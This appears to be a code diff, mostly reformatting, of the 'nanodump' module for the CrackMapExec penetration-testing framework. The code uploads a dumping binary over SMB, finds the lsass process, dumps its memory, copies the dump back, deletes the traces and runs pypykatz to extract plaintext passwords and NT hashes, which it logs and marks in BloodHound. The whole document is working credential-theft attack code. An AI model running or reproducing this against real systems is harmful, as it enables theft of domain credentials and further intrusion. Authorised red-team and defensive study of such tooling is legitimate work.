@@ -11,13 +11,12 @@ import string
 from cme.helpers.logger import highlight
 from cme.helpers.bloodhound import add_user_bh
 
-
 class CMEModule:
 
     name = 'nanodump'
     description = "Get lsass dump using nanodump and parse the result with pypykatz"
     supported_protocols = ['smb']
-    opsec_safe = True  # not really
+    opsec_safe = True # not really
     multiple_hosts = True
 
     def options(self, context, module_options):
@@ -61,15 +60,14 @@ class CMEModule:
             self.tmp_dir = module_options['TMP_DIR']
 
         if 'DIR_RESULT' in module_options:
-            self.dir_result = module_options['DIR_RESULT']
+            self.dir_result = module_options['DIR_RESULT']       
 
     def on_admin_login(self, context, connection):
         if self.useembeded == True:
             with open(self.nano_path + self.nano, 'wb') as nano:
                 # Figure out if we're dealing with 32-bit or 64-bit Windows
                 command = 'wmic os get osarchitecture | find /v "OSArchitecture"'
-                context.log.info(
-                    'Determining system architecture: {}'.format(command))
+                context.log.info('Determining system architecture: {}'.format(command))
                 p = connection.execute(command, True)
                 if "32" in p:
                     context.log.info("32-bit Windows detected.")
@@ -80,29 +78,23 @@ class CMEModule:
                 else:
                     context.log.error('Unsupported Windows architecture')
                     sys.exit(1)
-
-        context.log.info('Copy {} to {}'.format(
-            self.nano_path + self.nano, self.tmp_dir))
+    
+        context.log.info('Copy {} to {}'.format(self.nano_path + self.nano, self.tmp_dir))
         with open(self.nano_path + self.nano, 'rb') as nano:
             try:
-                connection.conn.putFile(
-                    self.share, self.tmp_share + self.nano, nano.read)
-                context.log.success('Created file {} on the \\\\{}{}'.format(
-                    self.nano, self.share, self.tmp_share))
+                connection.conn.putFile(self.share, self.tmp_share + self.nano, nano.read)
+                context.log.success('Created file {} on the \\\\{}{}'.format(self.nano, self.share, self.tmp_share))
             except Exception as e:
-                context.log.error(
-                    'Error writing file to share {}: {}'.format(self.share, e))
-
+              context.log.error('Error writing file to share {}: {}'.format(self.share, e))
+    
         # get pid lsass
         command = 'tasklist /v /fo csv | findstr /i "lsass"'
         context.log.info('Getting lsass PID {}'.format(command))
         p = connection.execute(command, True)
         pid = p.split(',')[1][1:-1]
         lower_digits = string.ascii_lowercase + string.digits
-        nano_log_name = ''.join(random.choice(lower_digits)
-                                for i in range(10)) + '.log'
-        command = self.tmp_dir + self.nano + ' --pid ' + \
-            pid + ' --write ' + self.tmp_dir + nano_log_name
+        nano_log_name = ''.join(random.choice(lower_digits) for i in range(10)) + '.log'
+        command = self.tmp_dir + self.nano + ' --pid ' + pid + ' --write ' + self.tmp_dir + nano_log_name
         context.log.info('Executing command {}'.format(command))
         p = connection.execute(command, True)
         context.log.debug(p)
@@ -111,37 +103,28 @@ class CMEModule:
             context.log.success('Process lsass.exe was successfully dumped')
             dump = True
         else:
-            context.log.error(
-                'Process lsass.exe error on dump, try with verbose')
-
+            context.log.error('Process lsass.exe error on dump, try with verbose')
+        
         if dump:
             context.log.info('Copy {} to host'.format(nano_log_name))
             with open(self.dir_result + nano_log_name, 'wb+') as dump_file:
                 try:
-                    connection.conn.getFile(
-                        self.share, self.tmp_share + nano_log_name, dump_file.write)
-                    context.log.success('Dumpfile of lsass.exe was transferred to {}'.format(
-                        self.dir_result + nano_log_name))
+                    connection.conn.getFile(self.share, self.tmp_share + nano_log_name, dump_file.write)
+                    context.log.success('Dumpfile of lsass.exe was transferred to {}'.format(self.dir_result + nano_log_name))
                 except Exception as e:
                     context.log.error('Error while get file: {}'.format(e))
 
             try:
-                connection.conn.deleteFile(
-                    self.share, self.tmp_share + self.nano)
-                context.log.success(
-                    'Deleted nano file on the {} share'.format(self.share))
+                connection.conn.deleteFile(self.share, self.tmp_share + self.nano)
+                context.log.success('Deleted nano file on the {} share'.format(self.share))
             except Exception as e:
-                context.log.error(
-                    'Error deleting nano file on share {}: {}'.format(self.share, e))
-
+                context.log.error('Error deleting nano file on share {}: {}'.format(self.share, e))
+            
             try:
-                connection.conn.deleteFile(
-                    self.share, self.tmp_share + nano_log_name)
-                context.log.success(
-                    'Deleted lsass.dmp file on the {} share'.format(self.share))
+                connection.conn.deleteFile(self.share, self.tmp_share + nano_log_name)
+                context.log.success('Deleted lsass.dmp file on the {} share'.format(self.share))
             except Exception as e:
-                context.log.error(
-                    'Error deleting lsass.dmp file on share {}: {}'.format(self.share, e))
+                context.log.error('Error deleting lsass.dmp file on share {}: {}'.format(self.share, e))
 
             fh = open(self.dir_result + nano_log_name, "r+b")
             fh.seek(0)
@@ -150,40 +133,30 @@ class CMEModule:
             fh.write(b'\xa7\x93')
             fh.seek(6)
             fh.write(b'\x00\x00')
-            fh.close()
+            fh.close()         
 
-            context.log.info('pypykatz lsa minidump "{}" --outfile "{}.txt"'.format(
-                self.dir_result + nano_log_name, self.dir_result + nano_log_name))
-
+            context.log.info('pypykatz lsa minidump "{}" --outfile "{}.txt"'.format(self.dir_result + nano_log_name, self.dir_result + nano_log_name))
+            
             try:
-                context.log.info(
-                    'Invoke pypykatz in order to extract the credentials ...')
-                os.system('pypykatz lsa minidump "' + self.dir_result + nano_log_name +
-                          '" --outfile "' + self.dir_result + nano_log_name + '.txt" >/dev/null 2>&1')
+                context.log.info('Invoke pypykatz in order to extract the credentials ...')
+                os.system('pypykatz lsa minidump "' + self.dir_result + nano_log_name + '" --outfile "' + self.dir_result + nano_log_name + '.txt" >/dev/null 2>&1')
                 context.log.info("Extracted credentials:")
                 with open(self.dir_result + nano_log_name + ".txt", 'r') as outfile:
                     data = outfile.read()
                     regex = r"(?:username:? (?!NA)(?P<username>.+[^\$])\n.*domain(?:name)?:? (?P<domain>.+)\n)(?:.*password:? (?!None)(?P<password>.+)|.*\n.*NT: (?P<hash>.*))"
-                    matches = re.finditer(
-                        regex, data, re.MULTILINE | re.IGNORECASE)
+                    matches = re.finditer(regex, data, re.MULTILINE | re.IGNORECASE)
                     credz_bh = []
                     domain = ""
                     for match in matches:
                         domain = match.group("domain")
                         username = match.group("username")
-                        password = match.group(
-                            "password") or match.group("hash")
-                        context.log.success(
-                            highlight(domain + "\\" + username + ":" + password))
+                        password = match.group("password") or match.group("hash")
+                        context.log.success(highlight(domain + "\\" + username + ":" + password))
                         if "." not in domain and domain.upper() in connection.domain.upper():
                             domain = connection.domain
-                            credz_bh.append(
-                                {'username': username.upper(), 'domain': domain.upper()})
+                            credz_bh.append({'username': username.upper(), 'domain': domain.upper()})
                     if domain:
-                        add_user_bh(credz_bh, domain, context.log,
-                                    connection.config)
+                        add_user_bh(credz_bh, domain, context.log, connection.config)
             except Exception as e:
-                context.log.error(
-                    'Error while executing pypykatz: {}'.format(e))
-                context.log.error(
-                    'Please make sure pypykatz is installed (pip3 install pypykatz)')
+                context.log.error('Error while executing pypykatz: {}'.format(e))
+                context.log.error('Please make sure pypykatz is installed (pip3 install pypykatz)')
